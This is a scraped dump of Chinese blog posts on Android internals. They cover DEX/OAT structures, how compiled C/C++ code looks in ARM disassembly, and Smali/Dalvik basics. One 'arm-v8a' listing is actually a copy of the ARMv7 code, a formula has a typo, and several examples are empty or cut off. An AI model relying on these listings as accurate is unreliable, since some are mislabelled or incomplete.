DexClassData { DexClassDataHeader header; //指定字段与方法的个数 DexField* staticFields; //静态字段 DexField* instanceFields; //实例字段 DexMethod* directMethods; //直接方法 DexMethod* virtualMethods; //虚方法 }; struct DexClassDataHeader { u4 staticFieldsSize; //静态字段的个数 u4 instanceFieldsSize; //实例字段的个数 u4 directMethodsSize; //直接方法的个数 u4 virtualMethodsSize; //虚方法的个数 }; //描述了字段的类型与访问标志 struct DexField { u4 fieldIdx; //指向DexFieldId列表的索引 u4 accessFlags; //访问标志 }; //描述了方法的原型、名称、访问标志及代码块 struct DexMethod { u4 methodIdx; //指向DexMethodId列表的索引 u4 accessFlags; //访问标志 u4 codeOff; //指向DexCode结构的偏移量 }; //http://androidxref.com/2.3.7/xref/dalvik/libdex/DexFile.h //描述了方法的详细信息以及方法中的指令内容 typedef struct DexCode { u2 registersSize; //使用寄存器的个数 u2 insSize; //参数的个数 u2 outsSize; //调用其他方法时使用的寄存器的个数 u2 triesSize; //try/catch语句的个数 u4 debugInfoOff; //指向调试信息的偏移量 u4 insnsSize; //指令集的个数,以2字节为单位 u2 insns[1]; //指令集 /* followed by optional u2 padding */ /* followed by try_item[triesSize] */ /* followed by uleb128 handlersSize */ /* followed by catch_handler_item[handlersSize] */ } DexCode; ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:3:9","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"ODEX 在Android5.0之前,主要使用的虚拟机是Dalvik,而ODEX则是Dalvik对Dex文件进行优化后的产物. 其文件格式比Dex文件多了一个头. 可使用下述方法将ODEX文件转化为Dex文件: Dex_odex2dex.7z 将当前Android系统system/framework下的所有文件复制到本工具包的framework目录下 将工具包里的123.odex文件替换为自己的odex文件 双击odex2dex.bat文件即可 ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:4:0","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"OAT OAT文件是Android4.4中引入的,到了Android5.0之后,系统默认使用的虚拟机是ART.而OAT文件就是ART虚拟机对Dex文件进行优化的产物,是Android定制的Elf文件. 其头部定义结构如下: //http://androidxref.com/5.0.0_r2/xref/art/runtime/oat.h struct OatHeader { uint8_t magic_[4]; uint8_t version_[4]; uint32_t adler32_checksum_; InstructionSet instruction_set_; InstructionSetFeatures instruction_set_features_; uint32_t dex_file_count_; //OAT中包含Dex文件的个数 uint32_t executable_offset_; uint32_t interpreter_to_interpreter_bridge_offset_; uint32_t interpreter_to_compiled_code_bridge_offset_; uint32_t jni_dlsym_lookup_offset_; uint32_t portable_imt_conflict_trampoline_offset_; uint32_t portable_resolution_trampoline_offset_; uint32_t portable_to_interpreter_bridge_offset_; uint32_t quick_generic_jni_trampoline_offset_; uint32_t quick_imt_conflict_trampoline_offset_; uint32_t quick_resolution_trampoline_offset_; uint32_t quick_to_interpreter_bridge_offset_; // The amount that the image this oat is associated with has been patched. int32_t image_patch_delta_; uint32_t image_file_location_oat_checksum_; uint32_t image_file_location_oat_data_begin_; uint32_t key_value_store_size_; uint8_t key_value_store_[0]; // note variable width data at end }; 可使用下述方法进行Dex文件的提取: 在oat文件中搜索文本035,找到dex035 将dex035之前的内容全部删除 ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:5:0","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"参考链接 \u003cAndroid软件安全权威指南\u003e ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:6:0","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"这部分内容跟x86很大程度上都是一样的. ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:0:0","tags":["Android"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"加法 源代码: int main(int argc, char** argv){ 15 + 20; int n1 = 0; int n2 = 0; n1 = n1 + 1; n1 = 1 + 2; n1 = n1 + n2; printf(\"n1 = %d\\n\", n1); return 0; } arm-v7a: .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 LDR argc, =(aN1D - 0x2A0C) ; \"n1 = %d\\n\" .text:00002A06 MOVS argv, #3 .text:00002A08 ADD R0, PC ; \"n1 = %d\\n\" .text:00002A0A BLX printf .text:00002A0E MOVS R0, #0 .text:00002A10 POP {R7,PC} .text:00002A10 ; End of function main arm-v8a: .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 LDR argc, =(aN1D - 0x2A0C) ; \"n1 = %d\\n\" .text:00002A06 MOVS argv, #3 .text:00002A08 ADD R0, PC ; \"n1 = %d\\n\" .text:00002A0A BLX printf .text:00002A0E MOVS R0, #0 .text:00002A10 POP {R7,PC} .text:00002A10 ; End of function main ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:0:1","tags":["Android"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"减法 源代码: int main(int argc, char* argv[]){ int n1 = argc; int n2 = 0; scanf(\"%d\", \u0026n2); n1 = n1 - 100; n1 = n1 + 5 - n2; printf(\"n1 = %d\\n\", n1); return 0; } arm-v7a: .text:00002A30 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:00002A30 EXPORT main .text:00002A30 main ; DATA XREF: .text:000029EC↑o .text:00002A30 ; .got:main_ptr↓o .text:00002A30 .text:00002A30 var_10 = -0x10 .text:00002A30 var_C = -0xC .text:00002A30 .text:00002A30 argc = R0 ; int .text:00002A30 argv = R1 ; unsigned __int8 ** .text:00002A30 ; __unwind { .text:00002A30 PUSH {R4,R5,R7,LR} .text:00002A32 ADD R7, SP, #8 .text:00002A34 SUB SP, SP, #8 .text:00002A36 MOV R4, argc .text:00002A38 argc = R4 ; int .text:00002A38 LDR R0, =(__stack_chk_guard_ptr - 0x2A3E) .text:00002A3A ADD R0, PC ; __stack_chk_guard_ptr .text:00002A3C LDR R5, [R0] ; __stack_chk_guard .text:00002A3E LDR argv, [R5] .text:00002A40 LDR R0, =(aD - 0x2A4A) ; \"%d\" .text:00002A42 STR R1, [SP,#0x10+var_C] .text:00002A44 n1 = R4 ; int .text:00002A44 MOVS R1, #0 .text:00002A46 ADD R0, PC ; \"%d\" ; format .text:00002A48 STR R1, [SP,#0x10+var_10] .text:00002A4A MOV R1, SP .text:00002A4C BLX scanf .text:00002A50 argc = R4 ; int .text:00002A50 LDR R1, [SP,#0x10+var_10] .text:00002A52 n2 = R1 ; int .text:00002A52 LDR R0, =(aN1D - 0x2A5A) ; \"n1 = %d\\n\" .text:00002A54 SUBS n2, argc, n2 .text:00002A56 ADD R0, PC ; \"n1 = %d\\n\" .text:00002A58 SUBS R1, #0x5F ; '_' .text:00002A5A n1 = R1 ; int .text:00002A5A BLX printf .text:00002A5E LDR R0, [SP,#0x10+var_C] .text:00002A60 LDR R1, [R5] .text:00002A62 SUBS R0, R1, R0 .text:00002A64 ITTT EQ .text:00002A66 MOVEQ R0, #0 .text:00002A68 ADDEQ SP, SP, #8 .text:00002A6A POPEQ {argc,R5,R7,PC} .text:00002A6C BLX __stack_chk_fail .text:00002A6C ; End of function main 上述中的ITTT EQ指令中有3个T,表示接下来的3条指令是条件执行指令. IT EQ,这是thumb2的指令,是指令前缀. ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:0:2","tags":["Android"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"乘法 源代码: int main(int argc, char* argv[]){ int n1 = argc; int n2 = argc; printf(\"n1 * 15 = %d\\n\", n1 *15); return 0; } arm-v7a: .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 argc = R0 ; int .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 n2 = R0 ; int .text:00002A04 LDR R2, =(aN115D - 0x2A0E) ; \"n1 * 15 = %d\\n\" .text:00002A06 RSB.W argv, n2, n2,LSL#4 .text:00002A0A ADD R2, PC ; \"n1 * 15 = %d\\n\" .text:00002A0C MOV n2, R2 ; format .text:00002A0E BLX printf .text:00002A12 MOVS R0, #0 .text:00002A14 POP {R7,PC} .text:00002A14 ; End of function main ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:0:3","tags":["Android"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"除法 无符号 除数为2的幂(常量) 源代码: printf(\"argc / 8\", (unsigned int)argc / 8); arm-v7a: .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 LDR R2, =(aArgc8 - 0x2A0C) ; \"argc / 8\" .text:00002A06 LSRS argv, argc, #3 .text:00002A08 ADD R2, PC ; \"argc / 8\" .text:00002A0A MOV argc, R2 ; format .text:00002A0C BLX printf .text:00002A10 MOVS R0, #0 .text:00002A12 POP {R7,PC} .text:00002A12 ; End of function main //右移3位 LSRS argv, argc, #3 arm-v8a: .text:00000000000006A8 main ; DATA XREF: LOAD:0000000000000448↑o .text:00000000000006A8 ; .got:main_ptr↓o .text:00000000000006A8 .text:00000000000006A8 var_s0 = 0 .text:00000000000006A8 .text:00000000000006A8 argc = X0 ; int .text:00000000000006A8 argv = X1 ; unsigned __int8 ** .text:00000000000006A8 ; __unwind { .text:00000000000006A8 STP X29, X30, [SP,#-0x10+var_s0]! .text:00000000000006AC MOV X29, SP .text:00000000000006B0 LSR W1, W0, #3 .text:00000000000006B4 ADRL X0, aArgc8 ; \"argc / 8\" .text:00000000000006BC BL .printf .text:00000000000006C0 MOV W0, WZR .text:00000000000006C4 LDP X29, X30, [SP+var_s0],#0x10 .text:00000000000006C8 RET .text:00000000000006C8 ; } // starts at 6A8 .text:00000000000006C8 ; End of function main //右移3位 LSR W1, W0, #3 总结: x / 2^n = x \u003e\u003e n 除数为非2的幂(常量) MagicNumber无进位 源代码: printf(\"argc / 9\", (unsigned int)argc / 9); arm-v7a: .text:00002A00 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:00002A00 EXPORT main .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 MOV R1, #0x38E38E39 .text:00002A0C UMULL.W argc, R1, argc, R1 .text:00002A10 LDR R0, =(aArgc9 - 0x2A16) ; \"argc / 9\" .text:00002A12 ADD R0, PC ; \"argc / 9\" .text:00002A14 LSRS R1, R1, #1 .text:00002A16 BLX printf .text:00002A1A MOVS R0, #0 .text:00002A1C POP {R7,PC} .text:00002A1C ; End of function main //R1 = c MOV R1, #0x38E38E39 //R1 = (argc * R1) \u003e\u003e 32 UMULL.W argc, R1, argc, R1 //R1 = R1 \u003e\u003e 1 LSRS R1, R1, #1 //R1 = (argc * c) \u003e\u003e 32 \u003e\u003e 1 arm-v8a: .text:00000000000006A8 main ; DATA XREF: LOAD:0000000000000448↑o .text:00000000000006A8 ; .got:main_ptr↓o .text:00000000000006A8 .text:00000000000006A8 var_s0 = 0 .text:00000000000006A8 .text:00000000000006A8 argc = X0 ; int .text:00000000000006A8 argv = X1 ; unsigned __int8 ** .text:00000000000006A8 ; __unwind { .text:00000000000006A8 STP X29, X30, [SP,#-0x10+var_s0]! .text:00000000000006AC MOV X29, SP .text:00000000000006B0 MOV W8, #0x38E38E39 .text:00000000000006B8 UMULL X8, W0, W8 .text:00000000000006BC ADRP argc, #aArgc9@PAGE ; \"argc / 9\" .text:00000000000006C0 LSR argv, X8, #33 ; '!' .text:00000000000006C4 ADD X0, X0, #aArgc9@PAGEOFF ; \"argc / 9\" .text:00000000000006C8 BL .printf .text:00000000000006CC MOV W0, WZR .text:00000000000006D0 LDP X29, X30, [SP+var_s0],#0x10 .text:00000000000006D4 RET .text:00000000000006D4 ; } // starts at 6A8 .text:00000000000006D4 ; End of function main //W8 = c MOV W8, #0x38E38E39 //X8 = argc * W8 //这里W0就是argc UMULL X8, W0, W8 //argv = X8 \u003e\u003e 33 LSR argv, X8, #33 总结: 上述特征为:x / y = x * c \u003e\u003e 32 \u003e\u003e n 还原的话就看c,分为3种情况: c为正数:y = 2^n / c c为负数:y = 2^n / (2^32 - c) c溢出: y = 2^n / (2^32 + c) 以上述arm-v7a为例: c = 0x38E38E39 = 954437177, 为正. n = 32 + 1 = 33 则 y = 2^33 / 954437177 = 9 MagicNumber有进位 源代码: printf(\"argc / 7\", (unsigned int)argc / 7); arm-v7a: .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 MOVW argv, #0x4925 .text:00002A08 LDR R2, =(aArgc7 - 0x2A16) ; \"argc / 7\" .text:00002A0A MOVT R1, #0x2492 .text:00002A0E U","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:0:4","tags":["Android"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"取模 无符号 除数为2的幂 源代码: printf(\"argc % 8\", (unsigned int)argc % 8); arm-v7a: .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 LDR R2, =(aArgc8 - 0x2A0E) ; \"argc % 8\" .text:00002A06 AND.W argv, argc, #7 .text:00002A0A ADD R2, PC ; \"argc % 8\" .text:00002A0C MOV argc, R2 ; format .text:00002A0E BLX printf .text:00002A12 MOVS R0, #0 .text:00002A14 POP {R7,PC} .text:00002A14 ; End of function main //R1 = argc \u0026 7 AND.W R1, argc, #7 总结: x % y = x \u0026 (2^ - 1) 除数为非2的幂 源代码: printf(\"argc % 9\", (unsigned int)argc % 9); arm-v7a: .text:00002A00 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:00002A00 EXPORT main .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 MOVW argv, #0x8E39 .text:00002A08 LDR R2, =(aArgc9 - 0x2A16) ; \"argc % 9\" .text:00002A0A MOVT R1, #0x38E3 .text:00002A0E UMULL.W R1, R3, argc, R1 .text:00002A12 ADD R2, PC ; \"argc % 9\" .text:00002A14 LSRS R1, R3, #1 .text:00002A16 ADD.W R1, R1, R1,LSL#3 .text:00002A1A SUBS R1, argc, R1 .text:00002A1C MOV argc, R2 ; format .text:00002A1E BLX printf .text:00002A22 MOVS R0, #0 .text:00002A24 POP {R7,PC} .text:00002A24 ; End of function main MOVW R1, #0x8E39 MOVT R1, #0x38E3 UMULL.W R1, R3, argc, R1 LSRS R1, R3, #1 //上面是除法运算,结果在R1中 ADD.W R1, R1, R1,LSL#3 SUBS R1, argc, R1 //余数 = 被除数 - 除数 * 商 有符号 除数为2的幂 源代码: printf(\"argc % 8\", argc % 8); arm-v7a: .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 LDR R2, =(aArgc8 - 0x2A14) ; \"argc % 8\" .text:00002A06 ASRS argv, argc, #0x1F .text:00002A08 ADD.W R1, argc, R1,LSR#29 .text:00002A0C BIC.W R1, R1, #7 .text:00002A10 ADD R2, PC ; \"argc % 8\" .text:00002A12 SUBS R1, argc, R1 .text:00002A14 MOV argc, R2 ; format .text:00002A16 BLX printf .text:00002A1A MOVS R0, #0 .text:00002A1C POP {R7,PC} .text:00002A1C ; End of function main //R1 = argc \u003e\u003e 31 ASRS R1, argc, #31 //R1 = argc + R1 \u003e\u003e 29 //如果argc \u003e= 0, R1 = argc //如果argc \u003c 0, R1 = argc + 7 ADD.W R1, argc, R1,LSR#29 //R1 = R1 \u0026 ~7 BIC.W R1, R1, #7 //R1 = argc - R1 SUBS R1, argc, R1 总结: x \u003e= 0,x % y = x - x \u0026 ~(2^n - 1) x \u003c 0,x % y = x - (x + 2^n - 1) \u0026~(2^n - 1) 除数为非2的幂 源代码: printf(\"argc % 9\", argc % 9); arm-v7a: .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 MOVW argv, #0x8E39 .text:00002A08 LDR R2, =(aArgc9 - 0x2A16) ; \"argc % 9\" .text:00002A0A MOVT R1, #0x38E3 .text:00002A0E SMMUL.W R1, argc, R1 .text:00002A12 ADD R2, PC ; \"argc % 9\" .text:00002A14 ASRS R3, R1, #1 .text:00002A16 ADD.W R1, R3, R1,LSR#31 .text:00002A1A ADD.W R1, R1, R1,LSL#3 .text:00002A1E SUBS R1, argc, R1 .text:00002A20 MOV argc, R2 ; format .text:00002A22 BLX printf .text:00002A26 MOVS R0, #0 .text:00002A28 POP {R7,PC} .text:00002A28 ; End of function main MOVW argv, #0x8E39 MOVT R1, #0x38E3 SMMUL.W R1, argc, R1 ASRS R3, R1, #1 ADD.W R1, R3, R1,LSR#31 //上面是除法运算, R1为商 ADD.W R1, R1, R1,LSL#3 SUBS R1, argc, R1 //余数 = 被除数 - 商 * 除数 ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:0:5","tags":["Android"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"分支 if 源代码: if (argc \u003e 0){ printf(\"argc \u003e 0\"); } else{ puts(\"argc \u003c= 0\"); } arm-v7a: while 源代码: while (argc \u003c 10) { printf(\"%d\\n\", argc); argc++; } arm-v7a: do-while 源代码: do { printf(\"%d\\n\", argc); argc++; } while (argc \u003c 10); arm-v7a: Switch-case 这里只讨论做表的情况. 源代码: switch (argc) { case 1:{ printf(\"%d\", 1); break; } case 3:{ puts(\"3\"); break; } case 5:{ printf(\"%d\", 5); break; } case 9:{ printf(\"9\"); break; } } arm-v7a: ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:0:6","tags":["Android"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"函数 这一部分跟x86相差还是挺大的. 整型传参 源代码: int add1(int n1, int n2, int n3, int n4, int n5, int n6, int n7, int n8, int n9) { return n1 + n2 + n3 + n4 + n5 + n6 + n7 + n8 + n9; } int main(int argc, char *argv[]) { int n = add1(1, 2, 3, 4, 5, 6, 7, 8, 9); printf(\"%d\\n\", n); return 0; } arm-v7a: 从上面可以看到,前4个整型参数放在寄存器R0-R3中,后面的参数就入栈了,整型返回值放在R0中. arm-v8a: 从上面可以看到,前8个整型参数放在寄存器X0-X7中,后面的参数就入栈了,整型返回值放在X0中. 浮点传参 源代码: float add2(float f1, float f2, float f3, float f4, float f5, float f6, float f7, float f8, float f9) { return f1 + f2 + f3 + f4 + f5 + f6 + f7 + f8 + f9; } int main(int argc, char *argv[]) { float f = add2(1.0, 2.0, 3.0, 4.0, 5.0, 6.0, 7.0, 8.0, 9.0); printf(\"%f\\n\", f); return 0; } arm-v7a: 从上面可以看到,浮点传参跟整型传参没有区别,前4个参数放R0-R3,后面的参数入栈,浮点返回值放在R0中. arm-v8a: 从上面可以看到,前8个浮点参数,放浮点寄存器S0-S7,后面的浮点参数入栈,浮点返回值放在S0中. 混合传参 源代码: long long add3(int n1, float f2, int n3, float f4, int n5, float f6, int n7, float f8, int n9) { return n1 + f2 + n3 + f4 + n5 + f6 + n7 + f8 + n9; } int main(int argc, char *argv[]) { long long l = add3(1, 2.0, 3, 4.0, 5, 6.0, 7, 8.0, 9); printf(\"%ld\\n\", l); return 0; } arm-v7a: 从上面可以看到,混合传参对32位没有影响,前4个参数放R0-R3中,后面的参数入栈,长整型的返回值放在R1 . arm-v8a: 从上面可以看到,对于混合传参,64位的处理方式还是挺特别的,将整型参数放在X0-X7中,浮点参数放在S0-S7中,单从传参来说,没有办法区分谁是第一个参数,谁是第二个参数,除非有符号. 注意的小细节 源代码: long long add4(int n1, long long n2, float f3){ return n1 + n2 + f3; } int main(int argc, char *argv[]) { long long l = add4(1, 2, 3.0); printf(\"%ld\\n\", l); return 0; } arm-v7a: 本例中,long long add4(int n1, long long n2, float f3); 按理来说n1放R0,n2放R2, R1, f3放R3. 但从上面的汇编代码来看,并没有用到寄存器R1, 也就是说64位整型,低32位放的应该是2的幂下标的寄存器,如R1 R0, R3 R2. 而不是像R2 R1这种的. ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:0:7","tags":["Android"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"变量 全局变量 源代码: int g_n1 = 100; int g_n2; int g_n3 = fun1(10, 20); __attribute__ ((constructor)) void myload(){ printf(\"myload\\n\"); g_n2 = 200; } __attribute__ ((destructor)) void myunload(){ printf(\"myunload\\n\"); } int main(int argc, char *argv[]) { printf(\"%d %d %d\\n\", g_n1, g_n2, g_n3); return 0; } 总结: 全局变量初始化以及初始化函数在.init_array这个区段中. 反初始化函数在.fini_array这个区段中. 静态局部变量 源代码: void showStatic(int n) { static int nStatic = n; printf(\"%d\\n\", nStatic); } int main(int argc, char *argv[]) { showStatic(argc); return 0; } 总结: 这部分跟x86一样,就不细述了. ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:0:8","tags":["Android"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"数组 一维数组 源代码: int main(int argc, char *argv[]) { int ary[5] = {1, 2, 3, 4, 5}; printf(\"%d %d\", ary[1], ary[argc]); return 0; } 总结: 假设数组为ary[n] ary[x]寻址: 数组首地址 + x * sizeof(type) 二维数组 源代码: int main(int argc, char *argv[]) { int ary[2][3] = {1, 2, 3, 4, 5, 6}; int x = 0; int y = 0; scanf(\"%d\", \u0026x, \u0026y); printf(\"%d\", ary[x][y]); return 0; } 总结: 假设数组为ary[M][N] ary[x][y]寻址: ary + x * sizeof(type[N]) + y * sizeof(type) ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:0:9","tags":["Android"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"类 如果没有虚函数,类和结构体是没办法区分的. this指针 源代码: class Person{ public: Person(){ m_nAge = 10; m_nHeight = 20; }; ~Person(){}; int GetAge(){return m_nAge;} int GetHeight(){return m_nHeight;} private: int m_nAge; int m_nHeight; }; int main(int argc, char *argv[]) { Person person; return 0; } 总结: 32位this指针放在R0,64位this指针放在X0 对象作为参数 源代码: class Person{ public: Person(){ m_nAge = 10; m_nHeight = 20; m_nWeight = 30; }; ~Person(){}; public: int m_nAge; int m_nHeight; int m_nWeight; }; void showPerson(Person person){ person.m_nAge = 100; printf(\"%d %d %d\\n\", person.m_nAge, person.m_nHeight, person.m_nWeight); } int main(int argc, char *argv[]) { Person person; showPerson(person); return 0; } 总结: 将原类中的成员拷贝到一块内存区域,然后将该内存区域的首地址传进去 返回对象 源代码: class Person{ public: Person(){ m_nAge = 10; m_nHeight = 20; m_nWeight = 30; }; ~Person(){}; public: int m_nAge; int m_nHeight; int m_nWeight; }; Person getPerson(){ Person person; person.m_nAge = 100; person.m_nHeight = 200; person.m_nWeight = 300; return person; } int main(int argc, char *argv[]) { Person person = getPerson(); printf(\"%d %d %d\\n\", person.m_nAge, person.m_nHeight, person.m_nWeight); return 0; } 总结: 多传一个存放类对象的地址进去 构造函数 源代码: class Person{ public: Person(){ puts(\"Person()\"); }; ~Person(){}; virtual int getAge(){return m_nAge;} virtual int getHeight(){return m_nHeight;} public: int m_nAge; int m_nHeight; }; int main(int argc, char *argv[]) { Person person; return 0; } 总结: 类有虚函数,才可以识别构造函数 在构造函数中很明显的特征就是要填虚表地址, 还有一些特征比如说作用域内第一次调用,返回this指针 虚析构 源代码: class Person{ public: Person(){ puts(\"Person()\"); }; virtual ~Person(){}; virtual int getAge(){return m_nAge;} virtual int getHeight(){return m_nHeight;} public: int m_nAge; int m_nHeight; }; int main(int argc, char *argv[]) { Person *p = new Person; p-\u003e~Person();//这种没有释放空间 delete p; //这种要释放空间 return 0; } 总结: VS编译的x86需要传参来判断是不是需要释放空间, 而Clang编译的Arm却不是这样的,它生成了两个析构函数,一个释放空间,一个没有释放空间. 这样的话,析构就不需要传参了. 单重继承 源代码: class BaseHuman { public: BaseHuman() { m_nBase = 1000; } int m_nBase; }; class Person : public BaseHuman { public: Person() { puts(\"Person()\"); }; virtual ~Person() {}; virtual int getAge() { return m_nAge; } virtual int getHeight() { return m_nHeight; } public: int m_nAge; int m_nHeight; }; int main(int argc, char *argv[]) { Person person; return 0; } 总结: 父类构造在填虚表之前, 成员对象构造在填虚表之后. ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:0:10","tags":["Android"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"Smali是Android dex文件的反汇编. ","date":"2021-09-05","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/:0:0","tags":["Android"],"title":"Smali","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/"},{"categories":["Android基础"],"content":"Dalvik Android移动设备平台的核心组成部分之一,支持已转换为.dex(即Dalvik Executable)格式的Java应用程序的运行. 允许在有限的内存中同时运行多个虚拟机的实例,并且每一个Dalvik应用作为一个独立的Linux进程执行. 2014年6月5号,ART虚拟机代替Dalvik虚拟机. 指令格式 低版本NDK的源码中有Dalvik指令格式介绍,这里我们使用在线的Android源码查看Dalvik指令格式 http://androidxref.com/ Smali_Dalvik指令格式.7z instruction-formats.html: 上图中,左侧每一个字母表示4位,空格表示16位. 中间一列的 22x 第一个2表示有几个16位, 第二个2表示有几个寄存器,第三个x表示没有附加数值. dalvik-bytecode.html: 解析指令的时候,先根据op拿到指令格式,然后去instruction-formats.html查. 字符串池 例子：op VAA, string@BBBB 指令用到了1个寄存器参数vAA,并且还附加了一个字符串常量池索引string@BBBB mov v0, “Hello” mov v0, 0x12345678 以上两种对于解释执行的语言来说都是不可以的. 我们可以做个池,通常来说是个哈希表,如: 0 “Hello Luo” 1 “HelloHun” 代码就可以写成 mov v0, 0,但是这样无法区分是给数值0还是池的下标, 所有我们通常这样写,mov v0, string@0 ","date":"2021-09-05","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/:0:1","tags":["Android"],"title":"Smali","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/"},{"categories":["Android基础"],"content":"Dex反汇编工具 Dexdump:Android自带的,开源. IDA:可以用来看Smali汇编. dex2jar和jd-gui:Java字节码–\u003eDex字节码,Dex字节码–\u003eJava字节码.Java有很多成熟的反编译工具, 我们可以利用dex2jar这个工具将Dex字节码转换为Java字节码,就可以使用Java的反编译工具了. 注意 d-gui的反编译结果不是很可靠. 